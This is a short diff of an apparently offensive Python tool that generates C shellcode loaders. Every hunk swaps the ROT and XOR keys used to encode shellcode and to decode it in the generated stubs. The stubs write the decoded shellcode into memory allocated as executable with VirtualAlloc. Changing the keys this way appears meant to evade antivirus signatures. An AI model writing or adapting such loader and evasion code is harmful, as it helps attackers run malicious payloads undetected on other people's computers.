@@ -18,7 +18,7 @@ def rot_compailed(shellcode_size, shellcode):
         
         for (int i = 0; i < sizeof shellcode; i++)
         {
-            shellcode[i] = shellcode[i] - 13;
+            shellcode[i] = shellcode[i] - 7;
         }
         PVOID shellcodeLocation = VirtualAlloc(0, sizeof shellcode, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
         memcpy(shellcodeLocation, shellcode, sizeof shellcode);
@@ -52,7 +52,7 @@ def xor_compailed(shellcode_size, shellcode):
         
           for (int i = 0; i < sizeof shellcode; i++)
             {
-                shellcode[i] = shellcode[i] ^ 0x11 ^ 0x55;
+                shellcode[i] = shellcode[i] ^ 0x1C ^ 0x5D;
             }
             
         
@@ -84,7 +84,7 @@ def Fiber_rot_13():
                 code = f.read(1)
                 if not code:
                     break
-                base10 = ord(code) + 0x0D
+                base10 = ord(code) + 0x07
                 code_hex = hex(base10)
                 code_hex = code_hex.replace('0x', '')
 
@@ -109,7 +109,7 @@ def Fiber_xor_13():
                 code = f.read(1)
                 if not code:
                     break
-                base10 = ord(code) ^ 0x55 ^ 0x11
+                base10 = ord(code) ^ 0x5D ^ 0x1C
                 code_hex = hex(base10)
                 code_hex = code_hex.replace('0x', '')
 
